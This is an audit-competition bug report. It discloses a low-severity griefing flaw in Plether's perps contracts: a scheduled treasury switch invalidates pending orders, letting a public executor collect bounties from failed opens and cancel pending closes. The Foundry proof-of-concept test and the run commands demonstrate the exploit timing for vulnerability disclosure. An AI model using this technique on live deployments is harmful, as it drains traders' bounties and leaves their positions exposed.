# \#99703 [SC-Low] Scheduled treasury activation cancels pending closes and pays bounties for failed opens

**Submitted on Nov 14th 2026 at 21:00:23 UTC by @nemveer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99703
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro
An owner-scheduled treasury change takes effect when the current treasury lock expires. The treasury address is part of the Router's execution configuration hash, so the switch changes that hash at the activation timestamp without a transaction. An external V3 order committed shortly before activation remains within its execution window but fails with the terminal reason `ConfigMismatch` when processed afterward. A permissionless executor can collect the failed open's reserved execution bounty without opening the position. A pending manual close also fails and leaves the position open until the trader commits a replacement order.

## Vulnerability Details
The owner can lock treasury A and propose treasury B for activation at time `T`. The proposal emits `ProtocolTreasuryProposed`, and `pendingProtocolTreasury()` exposes `T`. At `T`, [`CfdTreasury._activeTreasury()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdTreasury.sol#L100-L106) returns B solely because `block.timestamp` reached the lock expiry; activation itself emits no event.

Suppose Alice commits an external V3 order at `T - 20 seconds`. Its `expectedConfigHash` is the then-current hash containing treasury A. [`OrderLifecycleBook.currentExecutionConfigHash()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderLifecycleBook.sol#L172-L203) includes `engine.protocolTreasury()`. At `T`, that getter returns B, changing the hash while Alice's order is still inside its 60-second execution window. The Router accepts the commitment before the switch; it does not reject a commitment whose execution window crosses a scheduled treasury activation.

When anyone processes the order after `T`, [`OrderRouterExecutionSidecar._preOracleAction()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L910-L918) compares the pinned hash with the current hash before reading oracle updates. It returns terminal `ConfigMismatch` on the difference. [Terminal settlement](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L314-L344) releases the order reservation and pays any reserved open bounty to the executor. The order cannot be retried; Alice must submit a new commitment using B's hash and a new client order ID.

This combines documented behavior: scheduled treasury activation, inclusion of the treasury in the execution hash, and terminal handling of configuration mismatches ([`SECURITY.md`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L767-L776)). The schedule is observable in advance through the proposal event and `pendingProtocolTreasury()`. The failure occurs when an otherwise valid pending order crosses that published activation time. It affects ordinary traders even when the treasury account never trades. Internal protection closes use a zero expected hash and are outside this case.

## Impact Details
A public executor can watch the announced activation time and pending orders, then call `executeOrder` after the switch with an empty oracle payload. Each affected open is terminalized without a price update, and the executor receives its reserved execution bounty. The test measures a default bounty of **0.20 USDG** for one open; Alice pays that bounty and receives no position. Pending manual closes fail without closing the position, so the trader must create and execute a new close while the existing position remains exposed to price movement. In the PoC, the position is 10,000 units; the test establishes continued exposure, not a measured trading loss.

This is a bounded instance of the competition's listed [**Griefing** impact](https://immunefi.com/audit-competition/plether/scope/): a legitimate owner-scheduled treasury rotation causes a public executor to waste traders' order bounties and cancel timely close requests. The executor does not control the schedule. Each affected order must still be pending at activation and processed within its execution deadline. Multiple orders can be affected by one rotation, with one bounty payment per failed open that reserved a bounty.



## Proof of Concept

## Proof of Concept
The attached `INS09_TreasuryActivationExpanded.t.sol` is a single Foundry test file for the competition source at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. From the repository root, copy it into the test tree and run:

```sh
cp submissions/final/INS-09_timed_treasury_order_failure/INS09_TreasuryActivationExpanded.t.sol packages/perps/test/poc/
FOUNDRY_TEST=test/poc forge test --root packages/perps --match-path 'test/poc/INS09_TreasuryActivationExpanded.t.sol' --offline --out out-ins09-expanded --cache-path cache-ins09-expanded -vv
```

Both tests passed:

- `test_SwitchPaysCleanerForAnOpenThatCannotExecute`: Alice commits an open 20 seconds before `T`. At `T`, a public executor calls `executeOrder` with an empty Pyth payload. The order fails with `ConfigMismatch`, Alice has no position, and the executor's clearinghouse balance increases by the 0.20 USDG bounty.
- `test_SwitchCancelsAManualCloseThatExecutesBeforeActivation`: Alice opens a 10,000-unit long and commits a full manual close 20 seconds before `T`. A same-state control executes that close before activation. After restoring the snapshot, processing at `T` fails with `ConfigMismatch` and leaves the full position open. A newly committed close using B's hash then executes and closes it.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IMarginClearinghouse} from "@plether/perps/interfaces/IMarginClearinghouse.sol";
import {OrderRouterTestBase} from "../perps/shared/OrderRouterTestBase.sol";

/// @notice A scheduled treasury switch invalidates a still-live external V3 order.
/// Copy this file to packages/perps/test/poc/ in the competition checkout and run:
/// FOUNDRY_TEST=test/poc forge test --root packages/perps --match-path test/poc/INS09_TreasuryActivationExpanded.t.sol --offline -vv
contract INS09_TreasuryActivationExpandedTest is OrderRouterTestBase {
    address internal constant TREASURY_A = address(0xA11);
    address internal constant TREASURY_B = address(0xB22);
    address internal constant CLEANER = address(0xC33);

    function _request(bool isClose, bytes32 clientId) internal view returns (OrderV3Types.OrderRequest memory request) {
        request = OrderV3Types.OrderRequest({
            clientOrderId: clientId,
            side: CfdTypes.Side.LONG,
            sizeDelta: 10_000e18,
            marginDelta: isClose ? 0 : 1_000e6,
            targetPrice: isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + 60),
                executionWindowSeconds: 60,
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _commit(bool isClose, bytes32 clientId) internal returns (uint64 orderId) {
        OrderV3Types.OrderRequest memory request = _request(isClose, clientId);
        vm.prank(alice);
        orderId = router.commitOrder(request);
    }

    function _scheduleSwitch() internal returns (uint256 activationTime) {
        engine.setProtocolTreasury(TREASURY_A, 1 days);
        engine.proposeProtocolTreasury(TREASURY_B, 0);
        (address pending, uint256 timestamp,) = engine.pendingProtocolTreasury();
        assertEq(pending, TREASURY_B);
        activationTime = timestamp;
    }

    function _openAlice() internal {
        uint64 orderId = _commit(false, bytes32(uint256(1)));
        bytes[] memory data = _mockPythUpdateData();
        vm.prank(CLEANER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        (uint256 size,,,,,,) = engine.positions(alice);
        assertEq(size, 10_000e18);
    }

    function test_SwitchPaysCleanerForAnOpenThatCannotExecute() public {
        uint256 activationTime = _scheduleSwitch();
        vm.warp(activationTime - 20);
        vm.roll(block.number + 1);

        bytes32 pinnedHash = router.lifecycleBook().currentExecutionConfigHash();
        uint64 orderId = _commit(false, bytes32(uint256(2)));
        uint256 bounty = clearinghouse.getBountyReservation(IMarginClearinghouse.BountyKind.Order, orderId).amountAssets;
        uint256 cleanerBefore = clearinghouse.balanceAssets(CLEANER);
        assertEq(bounty, 200_000, "default open bounty is 0.20 USDG");

        vm.warp(activationTime);
        vm.roll(block.number + 1);
        assertEq(engine.protocolTreasury(), TREASURY_B);
        assertTrue(router.lifecycleBook().currentExecutionConfigHash() != pinnedHash);

        vm.prank(CLEANER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, new bytes[](0));
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.ConfigMismatch));
        assertEq(clearinghouse.balanceAssets(CLEANER), cleanerBefore + bounty);
        (uint256 size,,,,,,) = engine.positions(alice);
        assertEq(size, 0);
    }

    function test_SwitchCancelsAManualCloseThatExecutesBeforeActivation() public {
        _openAlice();
        uint256 activationTime = _scheduleSwitch();
        vm.warp(activationTime - 20);
        vm.roll(block.number + 1);
        uint64 closeId = _commit(true, bytes32(uint256(3)));
        uint256 checkpoint = vm.snapshotState();

        // Control: the identical committed close executes while treasury A remains active.
        vm.warp(activationTime - 10);
        bytes[] memory data = _mockPythUpdateData();
        vm.prank(CLEANER);
        OrderV3Types.ExecutionResult memory control = router.executeOrder(closeId, data);
        assertEq(uint8(control.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        (uint256 controlSize,,,,,,) = engine.positions(alice);
        assertEq(controlSize, 0);

        assertTrue(vm.revertToStateAndDelete(checkpoint));
        // Treatment: time alone activates B; the close is still inside its 60-second window.
        vm.warp(activationTime);
        vm.roll(block.number + 1);
        vm.prank(CLEANER);
        OrderV3Types.ExecutionResult memory failed = router.executeOrder(closeId, new bytes[](0));
        assertEq(uint8(failed.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(failed.terminalReason), uint8(OrderV3Types.TerminalReason.ConfigMismatch));
        (uint256 remainingSize,,,,,,) = engine.positions(alice);
        assertEq(remainingSize, 10_000e18);

        // Recovery requires a new user commitment under B's hash.
        uint64 replacementId = _commit(true, bytes32(uint256(4)));
        bytes[] memory replacementData = _mockPythUpdateData();
        vm.prank(CLEANER);
        OrderV3Types.ExecutionResult memory replacement = router.executeOrder(replacementId, replacementData);
        assertEq(uint8(replacement.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        (uint256 finalSize,,,,,,) = engine.positions(alice);
        assertEq(finalSize, 0);
    }
}
```
